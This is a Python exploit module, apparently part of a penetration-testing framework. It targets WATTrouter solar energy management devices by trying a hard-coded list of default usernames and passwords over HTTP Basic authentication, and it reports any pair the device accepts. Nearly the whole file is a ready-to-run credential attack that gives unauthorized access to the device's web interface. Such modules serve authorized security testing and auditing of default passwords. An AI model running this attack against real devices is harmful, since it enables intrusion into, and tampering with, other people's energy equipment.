# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""WATTrouter — Default Web Interface Credentials.

Version: 1.0.0
"""

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "wattrouter"),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
]


class Exploit(HTTPClient):
    """WATTrouter Default Web Interface Credentials.

    Attempts authentication against the WATTrouter solar energy management
    device web interface using known default credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "WATTrouter Default Credentials",
        "description": (
            "Attempts authentication against WATTrouter solar devices using default "
            "credentials including admin:admin and admin:wattrouter."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": ("https://www.wattrouter.com/",),
        "devices": ("WATTrouter M", "WATTrouter Mx"),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(8081, "HTTP port")
    stop_on_success = OptBool(True, "Stop after first valid credential pair")

    def run(self) -> None:
        import base64
        print_status("Trying default credentials on {}:{}...".format(self.target, self.port))
        found = False
        for username, password in _DEFAULT_CREDENTIALS:
            token = base64.b64encode("{}:{}".format(username, password).encode()).decode()
            resp = self.http_request(
                method="GET",
                path="/",
                headers={"Authorization": "Basic {}".format(token)},
            )
            if resp and resp.status_code == 200:
                text = resp.text or ""
                if "login" not in text.lower():
                    print_success("Valid credentials: {}:{}".format(username, password))
                    found = True
                    if self.stop_on_success:
                        return
            code = resp.status_code if resp else "no response"
            print_status("  {}:{} — {}".format(username, password, code))

        if not found:
            print_error("No default credentials accepted")

    @mute
    def check(self) -> bool:
        resp = self.http_request(method="GET", path="/")
        return resp is not None and resp.status_code in (200, 401)
